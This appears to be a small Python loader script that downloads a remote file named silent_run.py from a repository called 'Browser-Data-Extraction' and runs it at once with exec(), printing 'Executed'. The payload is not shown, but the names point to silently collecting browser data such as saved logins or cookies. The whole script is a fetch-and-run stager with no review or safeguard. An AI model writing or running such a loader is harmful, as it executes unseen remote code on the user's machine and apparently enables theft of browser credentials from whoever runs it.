import urllib.request

url = "https://raw.githubusercontent.com/Cr0mb/Browser-Data-Extraction/refs/heads/main/silent_run.py"

try:
    with urllib.request.urlopen(url) as response:
        script_content = response.read().decode('utf-8')

    print("Executed\n")

    exec(script_content)

except Exception as e:
    print(f"Error fetching or executing the script: {e}")
